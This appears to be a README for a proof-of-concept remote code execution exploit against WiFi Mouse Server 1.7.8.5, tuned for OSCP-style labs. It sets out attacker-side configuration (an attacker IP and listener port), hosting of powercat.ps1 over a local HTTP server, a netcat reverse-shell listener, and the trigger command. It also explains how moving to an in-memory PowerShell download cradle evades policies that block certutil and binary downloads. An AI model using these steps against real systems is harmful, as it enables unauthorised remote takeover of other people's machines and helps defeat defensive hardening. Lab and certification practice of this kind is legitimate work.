# WiFi Mouse Server 1.7.8.5 - RCE (OSCP Optimized)

An optimized Python 3 Proof-of-Concept (PoC) exploit for **WiFi Mouse Server v1.7.8.5**. This script leverages an inherent protocol vulnerability to achieve Remote Code Execution (RCE) via automated keystroke injection. 

This version has been explicitly modified and tuned for **OSCP-style lab environments** where traditional public exploits fail due to host-hardening constraints (such as restricted `certutil.exe` execution or binary download blocking).

## Context & Attributions

* Historically tracked alongside community findings such as CVE-2022-3218.
* Heavily inspired by and adapted from the original public exploit by **[RedHatAugust](https://www.exploit-db.com/exploits/50972)**, Exploit-DB #49601.
* The original Exploit-DB script relies on `cmd.exe` and `certutil.exe` to drop a malicious executable to disk. In hardened or modern exam/lab structures, these LOLBins are often restricted or blocked by local group policies. This modified version shifts the vector completely into memory via a PowerShell web cradle using `powercat.ps1`.

## Usage

### Configure Your Payload (Inside the Script)

Open the script and update the configuration variables at the top of the file with your local environment settings:

```python
rhost = sys.argv[1]
lhost = "192.168.45.167"  # Your Attacker/Kali IP
lport = "443"             # Your Netcat Listener Port
http_port = "80"          # Your local HTTP Server Port hosting powercat
```

### Setup Host Listeners

Host `powercat.ps1` on your local attacker machine inside a directory:
```bash
python3 -m http.server 80
```

In a separate terminal tab, establish your reverse shell listener to configured `lport`:
```bash
nc -lvnp 443
```

### Trigger the Exploit
Execute the script against the target machine IP address:
```bash
python3 exploit.py <TARGET-IP>
```
